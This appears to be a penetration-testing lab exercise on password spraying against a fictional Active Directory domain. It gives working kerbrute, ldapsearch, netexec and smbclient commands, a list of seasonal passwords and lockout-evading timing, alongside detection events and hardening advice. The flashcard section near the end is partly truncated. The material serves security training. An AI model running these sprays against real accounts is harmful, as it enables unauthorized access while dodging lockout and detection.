    Exercise 3.4: Spray and Find

    Before You Begin

    Password spraying is the inversion of brute force. Brute force tries many passwords against one account; spray tries one password against many accounts. Spraying succeeds because human beings reuse the same handful of seasonal passwords across organizations. Pick Summer2026#, try it against every domain user, and you will find at least one. The technique is so reliable that it is the standard initial-access vector for state actors operating against unmonitored M365 tenants.

    Exercise 3.4 gives you a list of Nordport users and asks you to find the one whose password matches a seasonal pattern. The cracked account holds your flag in a token-scoped share.

    Tools required: kerbrute, netexec, ldapsearch, smbclient. Pre-installed on Kali.

    Scenario

    Marcus Bell: "There is always one. Maybe two. Pick a password your average user might use this season, try it against every account, and slow it down enough not to lock anyone out. Lockout policy says 5 failures in 15 minutes, so we stay under three. kerbrute passwordspray uses Kerberos AS-REQs that never increment the bad password count; so unlike SMB-based spraying, you do not lock anyone out by accident."

    The discoverable per-token account name follows the pattern summer.kowalski_<token>. The seasonal password is Summer2026#. Read the flag from your token-scoped directory under \\corp-dc01\SprayFlags\.

    Credentials:

    j.chen Welcome2026# LDAP enumeration to build the user list

    Domain: corp.nordport.local

    Brute vs Spray, Side by Side

    The two attacks invert each other. The table below makes the trade-off explicit.

    Dimension Brute force Password spray
    Direction many passwords -> 1 user 1 password -> many users
    Lockout risk very high (account locks in seconds) very low (one attempt per account)
    Detection signal per-account 4740 lockout volume spike on DC
    Yield only if password is in your list AND user has it hits whenever any user has the picked password
    When to choose when you must crack a specific account first-pass initial access against unknown users

    Spray Cadence That Stays Below Lockout

    The flowchart below is the time line you want for any multi-password spray. It assumes the standard 5-attempt / 15-minute lockout window plus a small buffer for legitimate user typos.

    flowchart LR
    P1["Pwd 1: Summer2026#"]
    W1["wait 20 min<br/>(lockout window + 5 buffer)"]
    P2["Pwd 2: Welcome2026#"]
    W2["wait 20 min"]
    P3["Pwd 3: Nordport2026#"]
    DOTS["..."]

    P1 --> W1 --> P2 --> W2 --> P3 --> DOTS

    Background: Why Spraying Beats Brute Force

    A typical AD lockout policy locks an account after 5 failed authentications within 15 minutes. Brute-forcing one user's password yields a lockout in seconds; you also alert the user (their account starts behaving strangely) and the SOC (event 4740 fires on lockout). Spraying flips the math: with 1000 users in the directory, spraying one password tries 1000 attempts but only one per account. No lockouts, no per-user anomalies, and the only signal is a volume spike at the DC.

    Why kerbrute is preferred for spraying

    kerbrute passwordspray uses Kerberos AS-REQs to test passwords. The KDC returns either:

    • KDC_ERR_PREAUTH_FAILED (24); wrong password
    • KRB_AS_REP; right password (issued ticket)
    • KDC_ERR_CLIENT_REVOKED (18); account locked or disabled
    • KDC_ERR_C_PRINCIPAL_UNKNOWN (6); user does not exist

    The key insight: a failed Kerberos pre-auth does not increment the standard badPwdCount LSA counter the way a failed SMB or LDAP bind does. Microsoft's lockout policy reads badPwdCount. A pre-auth failure increments a separate Kerberos-specific counter that, in default policies, does not feed lockout. So kerbrute passwordspray can hammer accounts without locking them.

    The non-locking behavior depends on the lockout policy configuration. Enterprises that explicitly enable Kerberos-based lockout (some hardened policies) negate the advantage. The default does not.

    Seasonal password patterns

    Patterns that have hit on every internal pentest one of us has run since 2018:

    Pattern Example values
    <Season><Year><Symbol> Spring2026#, Summer2026!, Fall2026#, Winter2026!
    <Company><Year><Symbol> Nordport2026#, Nordport2026!
    <Month><Year><Symbol> January2026#, April2026#
    Sports team + year Cowboys2026#, Yankees2026#
    Default templates Welcome2026#, Password123!

    A short curated list of 8 to 12 candidates is more useful than a giant wordlist. You only get one shot per account before lockout windows close, so quality of pick beats quantity.

    The lockout math

    With a 5-attempt / 15-minute window:

    • Try 1 password every 12 minutes per account: safe.
    • Try 4 passwords back-to-back: only if you accept the risk that the next legitimate failed login locks the account.
    • Try 5 passwords back-to-back: lockout on the next legitimate attempt.

    A safe operational rule is 3 attempts maximum per account per 15-minute window, leaving room for the legitimate user to mistype twice without locking themselves out. That bound is what the workbook's "stay under three" means.

    Tool Primer

    kerbrute passwordspray

    kerbrute passwordspray --dc <dc_ip> -d corp.nordport.local users.txt 'Summer2026#'

    Useful flags: - --dc target DC IP (otherwise kerbrute tries to resolve via DNS) - -d realm - -t thread count (default 10; lower is gentler) - --delay milliseconds between attempts - -v verbose - -o output file

    Building the user list

    ldapsearch -x -LLL -H ldap://<dc> \
  -D "CORP\j.chen" -w 'Welcome2026#' \
  -b "DC=corp,DC=nordport,DC=local" \
  "(&(objectCategory=person)(objectClass=user))" sAMAccountName \
  | grep -oE 'sAMAccountName: \S+' \
  | awk '{print $2}' \
  > users.txt

    The 250-user baseline plus 25 per-token accounts will yield ~275 lines.

    netexec spray (for comparison; do NOT use unless you accept lockout risk)

    netexec smb <dc> -u users.txt -p 'Summer2026#' -d corp.nordport.local --continue-on-success

    SMB-based spraying works but increments badPwdCount on every failure. Use kerbrute for production sprays unless you have explicit authorization to lock accounts.

    Walkthrough

    Step 1: Build the User List

    Spraying needs a username list. ldapsearch with the simple "all user objects" filter pulls every domain account in one query. Pipe through grep -oE to isolate the sAMAccountName: ... lines from the LDIF and awk to extract just the value.

    Kali - Pull every user's sAMAccountName

    mkdir -p ~/work/adpt-3-04 && cd ~/work/adpt-3-04
ldapsearch -x -LLL -H ldap://<dc_ip> \
  -D "CORP\j.chen" -w 'Welcome2026#' \
  -b "DC=corp,DC=nordport,DC=local" \
  "(&(objectCategory=person)(objectClass=user))" sAMAccountName \
  | grep -oE 'sAMAccountName: \S+' | awk '{print $2}' > users.txt
wc -l users.txt
    Token Effect
    (&(objectCategory=person)(objectClass=user)) Match user-class person objects only (no computers, no security groups).
    sAMAccountName Trailing attribute list; only this attribute is returned.
    grep -oE 'sAMAccountName: \S+' Extract sAMAccountName: value lines (drop everything else from the LDIF).
    awk '{print $2}' Print just the value (skip the sAMAccountName: prefix).
    wc -l Count lines. Expect ~275.

    If the count is far smaller, your LDAP page size is limiting results. Add -E 'pr=1000/noprompt' for paged results, or use -z 5000 to set a higher size limit.

    Step 2: Curate a Seasonal Password List

    A short curated list of likely passwords beats a giant wordlist for spraying. Each candidate consumes one attempt per account, so you want every entry to have a real chance of hitting. The list below is the seasonal/year/symbol patterns that hit on most internal sprays since 2018.

    Kali - Build a seasonal pwlist

    cat > pwlist.txt <<'EOF'
Summer2026#
Spring2026#
Winter2026!
Fall2026#
Nordport2026#
Welcome2026#
Password2026#
Cowboys2026!
EOF

    The heredoc syntax <<'EOF' (single-quoted EOF) prevents shell variable expansion inside the block; you get the literal lines exactly as typed.

    Step 3: Spray (One Password at a Time)

    Spray with one password against the entire user list, then wait the lockout window before trying the next. kerbrute passwordspray sends Kerberos AS-REQs in parallel; the KDC returns KDC_ERR_PREAUTH_FAILED for wrong passwords (without incrementing badPwdCount) and KRB_AS_REP for hits.

    Kali - kerbrute passwordspray for Summer2026#

    kerbrute passwordspray --dc <dc_ip> -d corp.nordport.local \
  users.txt 'Summer2026#' \
  -o kerbrute_summer.txt
    Flag Effect
    passwordspray Subcommand: one password against many users (vs bruteforce which is many passwords against one).
    --dc <ip> Target KDC IP (skip DNS resolution).
    -d <domain> Realm.
    <users_file> <password> Positional args: user list, then the single password.
    -o <file> Write hits ([+] VALID LOGIN) to file.

    Each [+] VALID LOGIN line is a hit. Filter to your token:

    grep "_${OCR_SCOPE_TOKEN}" kerbrute_summer.txt

    The matching account is summer.kowalski_<token>.

    If Summer2026# does not yield your hit (test runs may rotate the season), iterate through the rest of pwlist.txt:

    while read pw; do
  echo "=== $pw ==="
  kerbrute passwordspray --dc <dc_ip> -d corp.nordport.local users.txt "$pw" 2>/dev/null \
    | grep "VALID LOGIN.*${OCR_SCOPE_TOKEN}"
  sleep 1200   # 20-minute pause between sprays in production
done < pwlist.txt

    The sleep 1200 is omitted in this lab (no real users to lock out) but mandatory in production. Twenty minutes per pass is the minimum safe cadence under a 5-attempt / 15-minute lockout policy.

    Step 4: Validate the Credential

    Before chaining further steps, confirm the credential really works against SMB. netexec is the cheapest test: a single negotiate + session setup, then a single line of output.

    Kali - Confirm with netexec

    netexec smb corp-dc01 -u "summer.kowalski_${OCR_SCOPE_TOKEN}" \
  -p 'Summer2026#' -d corp.nordport.local

    Expect [+]. [-] STATUS_LOGON_FAILURE means the password from kerbrute is wrong; re-check your hit lines.

    Step 5: Read the Token-Scoped Flag

    The flag lives in a per-token directory under \\corp-dc01\SprayFlags\<token>\FLAG.txt. The DACL only allows the summer.kowalski_<token> user (and Domain Admins) to read; other students' directories are denied.

    Kali - Pull FLAG.txt from your scoped directory

    smbclient //corp-dc01/SprayFlags \
  -U "CORP\\summer.kowalski_${OCR_SCOPE_TOKEN}%Summer2026#" \
  -c "cd ${OCR_SCOPE_TOKEN}; get FLAG.txt"
cat FLAG.txt
    Token Effect
    \\\\ (double backslash) Bash escape; renders as \\ for the SMB UNC.
    -U "DOMAIN\\user%password" Inline cred. The % separator avoids a prompt.
    -c "cd <dir>; get FLAG.txt" Run two commands and exit; download FLAG.txt to current local dir.

    Submit the OCR{...} value.

    Common gotchas

    • Lockout misjudgment: in a real environment, omitting sleep 1200 between password passes will lock real users. The lab is configured to skip lockout tracking, but treat the loop as a teaching example, not a copy-paste template for production.
    • kerbrute case sensitivity: kerbrute lowercases usernames before sending. Your users.txt can be mixed case; the KDC normalizes anyway.
    • DC IP vs hostname: --dc accepts either, but DNS through the lab's resolver may fail intermittently. IP is more reliable.
    • Empty hit file: if kerbrute_summer.txt is empty, the password is wrong for everyone in the directory. Try the next candidate; do not assume the spray is broken.

    Blue Team Perspective

    A failed Kerberos pre-auth fires event 4771 on the DC. Volume + same source IP across many accounts is the signature.

    Activity Event ID Where it fires
    Failed Kerberos pre-auth 4771 DC Security log
    Failed NTLM authentication (netexec) 4625 DC Security log
    Account lockout (if you go too fast) 4740 DC Security log
    Defender for Identity "Suspected brute-force attack (Kerberos, NTLM)" MDI

    Spray vs lockout signals

    Lockout (4740) is the loudest signal because it has a per-account paper trail. A careful operator never triggers it. The detection that catches even a careful spray is volume on 4771: dozens of failed pre-auths from one source IP in one minute, distributed across many accounts. SIEM rule: alert when 4771 events from a single source exceed a baseline-derived threshold across more than 10 distinct accounts.

    Hardening Note

    Spraying targets users. Defenders that block at the user layer (MFA, conditional access, smart-lockout) defeat it without needing per-tool detection.

    Spray hardening

    • Enforce MFA on every external authentication surface (VPN, web SSO, federated apps).
    • Roll out passwordless / FIDO2 / Windows Hello for Business to high-value accounts.
    • Enable Smart Account Lockout in Azure AD / Entra ID for cloud-side spraying.
    • Wire Kerberos pre-auth failures into AD lockout policy (closes the kerbrute side door).
    • Build SIEM detections on event 4771 volume per source IP and per-source distinct-username cardinality.
    • Ban known-bad passwords (Azure AD Password Protection, on-prem agent) so seasonal patterns are rejected at password-set time.

    Analysis Questions

    1. kerbrute passwordspray uses Kerberos AS-REQs. Why does that not increment the lockout counter, and what configuration would change that?

    Reveal Answer

    Standard AD lockout reads the badPwdCount attribute, which is incremented by the Net Logon service in response to NTLM authentication failures (from SMB binds, LDAP simple binds, RDP attempts, and other NTLM-bearing protocols). Kerberos pre-authentication failures travel a separate path through the KDC; the KDC increments a different per-account counter that, in default Microsoft lockout policy, is not consulted. The configuration that would close this gap is the "Kerberos lockout" feature added in some EDR products or via custom Group Policy that wires the Kerberos pre-auth failure count into the lockout decision. By default it is not wired. Microsoft's official guidance increasingly suggests enabling additional Kerberos-based lockout, but penetration testers in 2026 still hit environments where kerbrute spraying is non-locking.

    2. Spraying succeeds because of seasonal patterns. From a defender's perspective, what is the most effective single mitigation, and why is rotating password complexity not it?

    Reveal Answer

    The most effective single mitigation is multi-factor authentication on every external authentication surface, including VPN, web SSO, and any AD federation. With MFA, a sprayed password no longer yields immediate access; the attacker has the password but still needs a second factor. Internal AD spraying gets harder to weaponize because internal services that consume credentials (RDP, SMB, internal web apps) are increasingly behind smart-card, FIDO2, or Windows Hello. Rotating password complexity (forcing more characters, more classes) is not it because users respond to complexity rules by appending # and incrementing year numbers; the patterns just change shape and remain sprayable. Microsoft's password policy guidance has moved away from forced periodic rotation precisely because the resulting patterns are predictable.

    3. The exercise uses a single seasonal password. In a real engagement an attacker would try ~10. What is the operational protocol for spraying multiple passwords without crossing the lockout threshold per account?

    Reveal Answer

    The protocol: spray one password against the full list, wait for the lockout observation window plus a margin (15 minutes + 5 = 20 minutes), spray the next password, wait again, repeat. With 10 candidate passwords this takes 200 minutes. Operators script the cadence to run overnight. Keep a count per account: never let a single account see more than 3 failures within any 15-minute rolling window across all your sprays, accounting for the user's own potential mistypes. Production tools like Spray.sh and MSOLSpray automate the cadence and per-account tracking. The risk is impatience: spraying two passwords back-to-back and finding nothing tempts an operator to spray a third immediately, which then crosses the threshold.

    Key Takeaways

    • Spraying one password against many users avoids per-account lockout in default AD policy.
    • kerbrute passwordspray uses AS-REQs that do not increment badPwdCount.
    • Seasonal patterns (Summer2026#, Nordport2026#) hit on most engagements.
    • Stay under 3 attempts per account per 15-minute window to leave headroom for the user.
    • Defender mitigation: MFA on every authentication surface, not more complex passwords.

    Answer 
    kerbrute passwordspray --dc 10.10.10.10 -d corp.local \

    Hits show as [+] VALID LOGIN: user@corp.local:Summer2026#. Add -v for verbose output.

    Card 2: Why kerbrute Does Not Lock

    Q: Why does kerbrute passwordspray usually not trigger AD account lockouts?

    Answer

    AD lockout reads badPwdCount, which is incremented by NTLM authentication failures (SMB, LDAP simple bind, RDP). Kerberos pre-auth failures use a separate KDC counter that the default lockout policy does not consult. So spraying via Kerberos AS-REQs does not increment badPwdCount and therefore does not trigger lockout. The exemption breaks if the environment has explicitly enabled Kerberos-based lockout via custom GPO or EDR.

    Card 3: Lockout Math

    Q: With a 5-attempt / 15-minute lockout policy, how many passwords can an operator spray per account per 15-minute window safely, and why?

    Answer

    Three. Five attempts in 15 minutes triggers lockout; if the operator uses 5, the legitimate user's next mistype causes a lockout that fires event 4740 and alerts the SOC. Three attempts per account per 15-minute window leaves two attempts of headroom for legitimate user typos. The cadence: spray one password against all users, wait 20 minutes (15 + 5 buffer), spray the next, repeat. Ten candidate passwords becomes a 200-minute job.

    Card 4: Seasonal Pattern Wordlist

    Q: List 6 password candidates that hit reliably on internal sprays in 2026.

    Answer

    Summer2026#, Spring2026#, Fall2026#, Winter2026!, <CompanyName>2026#, Welcome2026#. Honorable mentions: Password123!, <LocalSportsTeam>2026!, <Month>2026# for the current month. Curated seasonal lists of 8 to 12 entries beat 100K-line wordlists for spraying because each spray-pass costs time-per-account and you only get a few passes before lockout windows close.

    Card 5: Production Tool Comparison

    Q: For each of kerbrute, netexec (SMB protocol), and MSOLSpray, name the protocol used and whether it increments AD lockouts.

    Answer

    kerbrute passwordspray: Kerberos AS-REQ, does NOT increment badPwdCount in default policy. netexec smb: SMB / NTLM, increments badPwdCount on every failure. MSOLSpray: HTTPS to Microsoft Online (M365 / Azure AD), uses Azure AD authentication backend; lockout depends on Azure AD smart lockout policy (10 attempts, then 1-minute lockout escalating). Choose by target: kerbrute for AD, MSOLSpray for cloud, netexec only when you accept the lockout risk.
